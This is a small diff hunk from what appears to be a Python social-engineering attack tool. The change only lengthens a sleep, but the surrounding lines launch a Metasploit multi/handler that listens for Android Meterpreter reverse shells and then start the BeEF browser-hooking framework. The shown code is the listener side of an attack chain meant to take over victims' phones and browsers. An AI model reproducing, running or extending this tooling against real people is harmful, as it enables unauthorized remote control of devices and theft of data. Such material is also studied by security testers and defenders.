@@ -580,7 +580,7 @@ def socialEng():
                         'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LLANs + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_tcp;set LHOST ' + IP + ';set LPORT ' + PORT + ';set ReverseListenerBindAddress ' + LLANs + ';set AutoRunScript ' + tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\''
                         , shell=True)
             print "\nI: Please 5 sec waiting...\n"
-            time.sleep(5.0)
+            time.sleep(10.0)
             subprocess.call(
                 'cd /usr/share/beef-xss/ && gnome-terminal --tab -e \'./beef\''
                 , shell=True)
